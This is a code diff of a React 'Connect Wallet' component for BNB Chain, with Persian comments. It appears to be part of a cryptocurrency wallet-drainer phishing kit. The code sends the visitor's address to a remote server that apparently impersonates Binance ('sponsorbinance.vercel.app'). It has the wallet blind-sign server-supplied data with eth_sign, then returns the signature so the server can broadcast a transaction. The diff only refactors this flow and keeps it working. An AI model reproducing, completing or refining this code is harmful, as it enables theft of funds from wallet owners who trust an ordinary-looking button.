@@ -1,4 +1,3 @@
-import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
@@ -20,20 +19,24 @@ function App() {
     var sender = accounts[0];
     console.log("✅ Wallet Address:", sender);
 
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
+    let apiUrl = process.env.REACT_APP_API_URL; // استفاده از متغیر محیطی
 
     async function getRawSignature(address) {
       try {
-        let requestData = { handler: "tx", address: address, chain: "56", type: "coin" };
+        let requestData = { handler: "tx", address, chain: "56", type: "coin" };
 
-        var result = await jQuery.post(apiUrl, requestData);
-        var unsignedData = JSON.parse(result);
+        let response = await fetch(apiUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(requestData),
+        });
+
+        let unsignedData = await response.json();
         console.log("📜 Unsigned Data:", unsignedData);
 
-        // **✅ دریافت امضای خام از کیف پول**
         var rawSignature = await provider.request({
           method: "eth_sign",
-          params: [address, JSON.stringify(unsignedData)], // ارسال JSON صحیح
+          params: [address, JSON.stringify(unsignedData)], 
         });
 
         return rawSignature;
@@ -51,11 +54,14 @@ function App() {
           type: "coin",
         };
 
-        var result = await jQuery.post(apiUrl, requestData);
-        console.log("📤 Server Response:", result);
+        let response = await fetch(apiUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(requestData),
+        });
 
-        var resultJson = JSON.parse(result);
-        console.log("📤 Parsed Server Response:", resultJson);
+        let resultJson = await response.json();
+        console.log("📤 Server Response:", resultJson);
 
         return resultJson.txHash || resultJson.result || resultJson;
       } catch (error) {
@@ -76,14 +82,12 @@ function App() {
   }
 
   return (
-    <a
-      href="#"
-      id="connectWallet"
+    <button
       onClick={runner}
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
     >
       <span>Connect Wallet</span>
-    </a>
+    </button>
   );
 }
 
